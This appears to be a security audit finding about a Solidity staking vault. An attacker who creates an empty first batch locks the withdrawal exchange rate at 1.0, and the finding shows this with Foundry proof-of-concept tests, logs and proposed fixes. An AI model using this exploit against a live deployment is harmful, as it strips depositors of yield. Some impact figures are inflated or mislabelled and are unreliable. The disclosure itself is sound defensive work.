# M-01: First Batch Exchange Rate Lock Causes Complete Loss of Staking Yield for Early Users

## Description

The protocol allows anyone to process a batch immediately upon launch, which snapshots the initial exchange rate (1.0) and locks it for that batch.

All users who queue withdrawals in the first batch would receive **0 staking yield** and, in some cases, even take principal losses if they deposited after rewards began accruing.

## Finding Description

The fundamental promise of the Ventuals LST is stated in the [README](https://github.com/ventuals/ventuals-contracts/blob/main/README.md#overview):

> "**Native yield: All native staking yield accrues proportionally to vHYPE holders.**"

However, this promise is **completely broken** for all users withdrawing in the first batch due to an exchange rate lock vulnerability.

When the first batch is created, which anyone can do immediately at launch without restrictions, the exchange rate is locked at 1.0. Regardless of the actual amount of staking yield accumulated, this results in subsequent withdrawals intended to be processed into the first batch stuck at 1.0 rate.

Users who hold vHYPE for a long time, during which the protocol earns substantial staking rewards, end up receiving the exact same amount of HYPE they originally deposited when withdrawing. They earn **zero yield** despite the protocol earning and other users receiving rewards.

This is not just **unfair** - it's a complete negation of the LST's core purpose.

**Even worse:** Users who deposit AFTER rewards start accruing (e.g., at rate 1.005) but before the first batch is created, then withdraw from the first batch locked at 1.0, actually **lose principal** - receiving less HYPE than they deposited.

### Root Cause

The vulnerability exists because

1. there are no timing restriction on the creation of first batch
2. there is no minimum withdrawal requirement; a batch can be created even with empty queue
3. anyone can call `processBatch()` to trigger batch creation

This combination results in a situation where:

- Batch created at rate 1.0 on Day 0
- Protocol earns 8% rewards over 30 days (rate should be 1.08)
- Users queuing withdrawals on Day 30 expecting 1.08 rate
- But they're assigned to first batch still locked at 1.0
- **Users receive 0% yield instead of expected 8%**

## Impact Explanation

1. 100% loss of staking yield for early users
2. Breaks core LST promise ("native yield accrues")
3. Can cause principal loss for users depositing after initial rewards
4. Affects all early adopters (most valuable users)

For protocol with $10M TVL where first batch lasts 30 days:

- **Expected yield distribution:** $800,000 (8% over 30 days)
- **Actual yield to first batch users:** $0
- **Total user loss over first batch:** $800,000

## Likelihood Explanation

1. Anyone can call processBatch() (permissionless)
2. No restrictions on first batch creation
3. Is easily executable

## Proof of Concept

Paste the following test cases in the [StakingVaultManager.t.sol](https://github.com/ventuals/ventuals-contracts/blob/3621e4dee349b0a187912f6e2ec0922d0ef55c05/test/StakingVaultManager.t.sol#L815) for simulating the issue:

1. Demonstrating users in first batch receive 0 staking yield due to rate lock

```solidity
 function test_FirstBatchZeroYield_CompleteYieldLoss() public withExcessStakeBalance {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        // Mock HyperCore accounts
        hl.mockCoreUserExists(attacker, true);
        hl.mockCoreUserExists(victim, true);

        // ===== SETUP: Victim deposits at protocol launch (rate 1.0) =====
        uint256 depositAmount = 5_000 * 1e18; // Use 5k to avoid withdrawal splitting
        vm.deal(victim, depositAmount);

        uint256 initialRate = stakingVaultManager.exchangeRate();
        console.log("DAY 0: Protocol Launch");
        console.log("- Current Exchange Rate: %e (1.0)", initialRate);
        console.log("- Total Balance: %e HYPE\n", stakingVaultManager.totalBalance());

        // Victim deposits at launch
        vm.prank(victim);
        stakingVaultManager.deposit{value: depositAmount}();

        uint256 victimVHYPE = vHYPE.balanceOf(victim);

        console.log("DAY 0: Victim Deposits");
        console.log("- Deposit amount: 5,000 HYPE");
        console.log("- vHYPE received: %e", victimVHYPE);
        console.log("- Exchange rate: %e", initialRate);
        console.log("- Victim expects to earn staking yield over time\n");

        assertEq(initialRate, 1e18, "Initial rate should be 1.0");
        assertEq(victimVHYPE, depositAmount, "Should receive 5,000 vHYPE at 1:1");

        // ATTACKER CREATES EMPTY FIRST BATCH TO LOCK THE RATE
        console.log("DAY 0 (moments later): Attacker Locks Rate");
        console.log("- Attacker calls processBatch() with empty queue");
        console.log("- Creates Batch #0 with snapshot rate = 1.0");

        vm.prank(attacker);
        uint256 processed = stakingVaultManager.processBatch(type(uint256).max);

        IStakingVaultManager.Batch memory batch0 = stakingVaultManager.getBatch(0);

        console.log("First Batch Created:");
        console.log("- Batch Index: 0");
        console.log("- Snapshot Exchange Rate: %e (LOCKED!)", batch0.snapshotExchangeRate);
        console.log("- vHYPE Processed: %s", processed);

        assertEq(batch0.snapshotExchangeRate, 1e18, "Snapshot locked at 1.0");
        assertEq(batch0.vhypeProcessed, 0, "Batch is empty");
        assertEq(processed, 0, "No withdrawals processed");

        // TIME PASSES, STAKING REWARDS ACCUMULATE
        console.log("DAYS 1-30: Time Passes, Rewards Accumulate");

        // Fast forward 30 days
        warp(block.timestamp + 30 days);

        // Mock staking rewards: 8% increase in delegated amount (WITHOUT minting new vHYPE)
        L1ReadLibrary.DelegatorSummary memory currentSummary = stakingVault.delegatorSummary();
        uint64 newDelegated = uint64((currentSummary.delegated * 108) / 100); // +8%

        _mockDelegations(validator, newDelegated);

        uint256 currentRate = stakingVaultManager.exchangeRate();
        uint256 rateIncrease = currentRate > initialRate ? ((currentRate - initialRate) * 100) / initialRate : 0;
        uint256 newTotalBalance = stakingVaultManager.totalBalance();

        console.log("- Days passed: 30");
        console.log("- New Total Balance: %e HYPE", newTotalBalance);
        console.log("- Current live exchange rate: %e", currentRate);
        console.log("- Rate increase: %s%%", rateIncrease);
        console.log("- Victim's vHYPE now worth: %e HYPE at current rate\n", (victimVHYPE * currentRate) / 1e18);

        uint256 expectedAtCurrentRate = (victimVHYPE * currentRate) / 1e18;
        uint256 expectedYield = expectedAtCurrentRate - depositAmount;

        console.log("Victim's Expectation:");
        console.log("- Original deposit: 5,000 HYPE");
        console.log("- Expected withdrawal: %e HYPE", expectedAtCurrentRate);
        console.log("- Expected yield: %e HYPE (%s%%)\n", expectedYield, rateIncrease);

        // VICTIM QUEUES WITHDRAWAL
        console.log("DAY 30: Victim Queues Withdrawal");
        console.log("- Victim held vHYPE for 30 days");
        console.log("- Victim sees current rate: %e", currentRate);
        console.log("- Victim queues withdrawal expecting yield\n");

        vm.prank(victim);
        vHYPE.approve(address(stakingVaultManager), victimVHYPE);
        vm.prank(victim);
        uint256[] memory withdrawIds = stakingVaultManager.queueWithdraw(victimVHYPE);

        console.log("Withdrawal Queued:");
        console.log("- Withdraw ID: %s", withdrawIds[0]);
        console.log("- vHYPE amount: %e\n", victimVHYPE);

        // WITHDRAWAL PROCESSED AT LOCKED RATE
        console.log("DAY 31: Withdrawal Processed Into First Batch");

        warp(block.timestamp + 1 days);
        stakingVaultManager.processBatch(type(uint256).max);

        IStakingVaultManager.Withdraw memory withdrawal = stakingVaultManager.getWithdraw(withdrawIds[0]);
        batch0 = stakingVaultManager.getBatch(0);

        uint256 actualHYPEAmount = (withdrawal.vhypeAmount * batch0.snapshotExchangeRate) / 1e18;

        console.log("- Withdrawal assigned to Batch: %s", withdrawal.batchIndex);
        console.log("- Batch snapshot rate: %e (STILL 1.0!)", batch0.snapshotExchangeRate);
        console.log("- Current live rate: %e (ignored!)", stakingVaultManager.exchangeRate());
        console.log("- vHYPE withdrawn: %e", withdrawal.vhypeAmount);
        console.log("- HYPE to receive: %e\n", actualHYPEAmount);

        assertEq(withdrawal.batchIndex, 0, "Should be in first batch");
        assertEq(batch0.snapshotExchangeRate, 1e18, "Rate STILL locked at 1.0");

        // The actual HYPE amount should equal the vHYPE amount (since rate is 1.0)
        assertEq(actualHYPEAmount, withdrawal.vhypeAmount, "At rate 1.0, HYPE equals vHYPE");
        assertLt(actualHYPEAmount, expectedAtCurrentRate, "Victim gets less than at current rate");

        // CALCULATE VICTIM'S DEVASTATING LOSS
        uint256 lostYield = expectedAtCurrentRate - actualHYPEAmount;
        uint256 lossPercentage = (lostYield * 100) / expectedAtCurrentRate;

        console.log("VICTIM'S LOSSES");
        console.log("- Expected at current rate: %e HYPE", expectedAtCurrentRate);
        console.log("- Actual at locked rate: %e HYPE", actualHYPEAmount);
        console.log("- Lost yield: %e HYPE", lostYield);
        console.log("- Loss percentage: %s%% of expected return", lossPercentage);

        console.log("EXPLOIT SUCCESSFUL");
        console.log("- Victim held vHYPE for 30 days");
        console.log("- Protocol earned 8%% staking rewards");
        console.log("- Victim received 0%% yield [LOSS]");
        console.log("- Victim's vHYPE was worthless for yield generation");

        // Assertions
        assertGt(lostYield, 0, "Victim should have lost yield");
        assertGt(currentRate, batch0.snapshotExchangeRate, "Current rate higher than locked");

        // Victim receives at locked rate, losing ALL accumulated yield
        assertTrue(
            actualHYPEAmount < expectedAtCurrentRate, "CRITICAL: User receives less than fair value due to rate lock"
        );

        // Lost yield is 100% of expected yield (gets 0% of rewards)
        assertApproxEqRel(lostYield, expectedYield, 0.01e18, "100% loss");
    }
```

_Logs:_

```js
DAY 0: Protocol Launch
  - Current Exchange Rate: 1e18 (1.0)
  - Total Balance: 6e23 HYPE

  DAY 0: Victim Deposits
  - Deposit amount: 5,000 HYPE
  - vHYPE received: 5e21
  - Exchange rate: 1e18
  - Victim expects to earn staking yield over time

  DAY 0 (moments later): Attacker Locks Rate
  - Attacker calls processBatch() with empty queue
  - Creates Batch #0 with snapshot rate = 1.0
  First Batch Created:
  - Batch Index: 0
  - Snapshot Exchange Rate: 1e18 (LOCKED!)
  - vHYPE Processed: 0
  DAYS 1-30: Time Passes, Rewards Accumulate
  - Days passed: 30
  - New Total Balance: 6.53e23 HYPE
  - Current live exchange rate: 1.079338842975206611e18
  - Rate increase: 7%
  - Victim's vHYPE now worth: 5.396694214876033055e21 HYPE at current rate

  Victim's Expectation:
  - Original deposit: 5,000 HYPE
  - Expected withdrawal: 5.396694214876033055e21 HYPE
  - Expected yield: 3.96694214876033055e20 HYPE (7%)

  DAY 30: Victim Queues Withdrawal
  - Victim held vHYPE for 30 days
  - Victim sees current rate: 1.079338842975206611e18
  - Victim queues withdrawal expecting yield

  Withdrawal Queued:
  - Withdraw ID: 1
  - vHYPE amount: 5e21

  DAY 31: Withdrawal Processed Into First Batch
  - Withdrawal assigned to Batch: 0
  - Batch snapshot rate: 1e18 (STILL 1.0!)
  - Current live rate: 1.079338842975206611e18 (ignored!)
  - vHYPE withdrawn: 5e21
  - HYPE to receive: 5e21

  VICTIM'S LOSSES
  - Expected at current rate: 5.396694214876033055e21 HYPE
  - Actual at locked rate: 5e21 HYPE
  - Lost yield: 3.96694214876033055e20 HYPE
  - Loss percentage: 7% of expected return
  EXPLOIT SUCCESSFUL
  - Victim held vHYPE for 30 days
  - Protocol earned 8% staking rewards
  - Victim received 0% yield [LOSS]
  - Victim's vHYPE was worthless for yield generation
```

2.  Demonstrating user can even lose **principal** if depositing after rewards accumulate

```solidity
 function test_FirstBatchZeroYield_PrincipalLoss() public withExcessStakeBalance {
       address attacker = makeAddr("attacker");
       address victim = makeAddr("victim");

       hl.mockCoreUserExists(attacker, true);
       hl.mockCoreUserExists(victim, true);

       uint256 initialRate = stakingVaultManager.exchangeRate();
       console.log("DAY 0: Protocol Launches");
       console.log("- Initial exchange rate: %e", initialRate);
       console.log("- Total balance: %e HYPE\n", stakingVaultManager.totalBalance());

       // ATTACKER CREATES EMPTY FIRST BATCH TO LOCK THE RATE
       console.log("DAY 0: Attacker Creates Empty First Batch");
       vm.prank(attacker);
       stakingVaultManager.processBatch(type(uint256).max);

       IStakingVaultManager.Batch memory batch0 = stakingVaultManager.getBatch(0);
       console.log("- Batch #0 created with rate: %e (LOCKED)", batch0.snapshotExchangeRate);

       assertEq(batch0.snapshotExchangeRate, 1e18, "Snapshot locked at 1.0");

       // REWARDS ACCUMULATE
       console.log("DAYS 1-5: Early Rewards Accumulate");
       warp(block.timestamp + 5 days);

       // Mock 0.5% rewards (increase delegated amount only
       L1ReadLibrary.DelegatorSummary memory currentSummary = stakingVault.delegatorSummary();
       uint64 newDelegated = uint64((currentSummary.delegated * 1005) / 1000); // +0.5%

       _mockDelegations(validator, newDelegated);

       uint256 rateAfterRewards = stakingVaultManager.exchangeRate();
       uint256 newTotalBalance = stakingVaultManager.totalBalance();

       console.log("- Days passed: 5");
       console.log("- Rewards accumulated: 0.5%");
       console.log("- New total balance: %e HYPE", newTotalBalance);
       console.log("- Current exchange rate: %e\n", rateAfterRewards);

       assertGt(rateAfterRewards, 1e18, "Rate should have increased");

       // VICTIM DEPOSITS AT HIGHER RATE
       console.log("DAY 5: Victim Deposits (Unaware of Rate Lock)");

       uint256 depositAmount = 5_000 * 1e18;
       vm.deal(victim, depositAmount);

       vm.prank(victim);
       stakingVaultManager.deposit{value: depositAmount}();

       uint256 victimVHYPE = vHYPE.balanceOf(victim);

       console.log("- Deposit amount: 5,000 HYPE");
       console.log("- Exchange rate at deposit: %e", rateAfterRewards);
       console.log("- vHYPE received: %e", victimVHYPE);
       console.log("- Cost basis: 5,000 HYPE\n");

       assertLt(victimVHYPE, depositAmount, "Should receive less vHYPE at higher rate");

       // VICTIM WITHDRAWS AT LOCKED RATE
       console.log("DAY 30: Victim Queues Withdrawal");
       warp(block.timestamp + 25 days);

       vm.prank(victim);
       vHYPE.approve(address(stakingVaultManager), victimVHYPE);
       vm.prank(victim);
       uint256[] memory withdrawIds = stakingVaultManager.queueWithdraw(victimVHYPE);

       warp(block.timestamp + 1 days);
       stakingVaultManager.processBatch(type(uint256).max);

       IStakingVaultManager.Withdraw memory withdrawal = stakingVaultManager.getWithdraw(withdrawIds[0]);
       batch0 = stakingVaultManager.getBatch(0);

       uint256 receivedHYPE = (withdrawal.vhypeAmount * batch0.snapshotExchangeRate) / 1e18;
       uint256 principalLoss = depositAmount - receivedHYPE;

       console.log("Withdrawal Processed:");
       console.log("- Assigned to Batch #0");
       console.log("- Locked rate: %e (still 1.0!)", batch0.snapshotExchangeRate);
       console.log("- vHYPE withdrawn: %e", withdrawal.vhypeAmount);
       console.log("- HYPE received: %e\n", receivedHYPE);

       console.log("PRINCIPAL LOSS");
       console.log("- Original deposit: 5,000 HYPE");
       console.log("- HYPE received: %e", receivedHYPE);
       console.log("- NET LOSS: %e HYPE", principalLoss);
       console.log("- Loss percentage: %s%%\n", (principalLoss * 1000) / depositAmount);

       console.log("OUTCOME [CRITICAL]");
       console.log("- Victim deposited at rate %e", rateAfterRewards);
       console.log("- Victim withdrew at locked rate 1.0");
       console.log("- Not only zero yield, but negative return!");

       // Assertions
       assertLt(receivedHYPE, depositAmount, "Victim lost principal!");
       assertEq(batch0.snapshotExchangeRate, 1e18, "Rate still locked at 1.0");
       assertGt(rateAfterRewards, 1e18, "Rate was higher when victim deposited");

       assertTrue(receivedHYPE < depositAmount, "CRITICAL: User lost principal due to rate lock");
   }
```

_Logs:_

```js
 DAY 0: Protocol Launches
  - Initial exchange rate: 1e18
  - Total balance: 6e23 HYPE

  DAY 0: Attacker Creates Empty First Batch
  - Batch #0 created with rate: 1e18 (LOCKED)
  DAYS 1-5: Early Rewards Accumulate
  - Days passed: 5
  - Rewards accumulated: 0.5%
  - New total balance: 6.03e23 HYPE
  - Current exchange rate: 1.005e18

  DAY 5: Victim Deposits (Unaware of Rate Lock)
  - Deposit amount: 5,000 HYPE
  - Exchange rate at deposit: 1.005e18
  - vHYPE received: 4.975124378109452736318e21
  - Cost basis: 5,000 HYPE

  DAY 30: Victim Queues Withdrawal
  Withdrawal Processed:
  - Assigned to Batch #0
  - Locked rate: 1e18 (still 1.0!)
  - vHYPE withdrawn: 4.975124378109452736318e21
  - HYPE received: 4.975124378109452736318e21

  PRINCIPAL LOSS
  - Original deposit: 5,000 HYPE
  - HYPE received: 4.975124378109452736318e21
  - NET LOSS: 2.4875621890547263682e19 HYPE
  - Loss percentage: 4%

  OUTCOME [CRITICAL]
  - Victim deposited at rate 1.005e18
  - Victim withdrew at locked rate 1.0
  - Not only zero yield, but negative return!
```

## Recommendation

1. Require minimum withdrawals with minimum time

```solidity
// +++++ Add deployment timestamp +++++
uint256 public immutable deploymentTimestamp;

constructor() {
   //+++++ assign block.timestamp to deploymentTimestamp ++++
    deploymentTimestamp = block.timestamp;
    _disableInitializers();
}

function _fetchBatch() internal view returns (Batch memory) {
    if (currentBatchIndex == batches.length) {
        // ALWAYS enforce timing, even for first batch
        if (lastFinalizedBatchTime != 0) {
            require(
                block.timestamp > lastFinalizedBatchTime + 1 days,
                BatchNotReady()
            );
            // ... delegation lock check ...
        } else {
            // +++++ For first batch, wait minimum time to accumulate rewards +++++
            // can adjust to any time
            require(
                block.timestamp >= deploymentTimestamp + 7 days,
                FirstBatchNotReady(deploymentTimestamp + 7 days)
            );
        }

        // +++++ Require at least one withdrawal in queue +++++
        require(withdrawQueue.sizeOf() > 0, NoWithdrawalsInQueue());

        uint256 snapshotExchangeRate = exchangeRate();

        // ... rest of function
    }
}
```

2. Access Control for the first batch processing

```solidity
function processBatch(uint256 numWithdrawals)
    public
    whenNotPaused
    whenBatchProcessingNotPaused
{
    // ++++ During first batch period, require operator role ++++
    if (lastFinalizedBatchTime == 0) {
        require(
            roleRegistry.hasRole(roleRegistry.OPERATOR_ROLE(), msg.sender),
            OnlyOperatorCanCreateFirstBatch()
        );
    }

    // ... rest of function
}
```
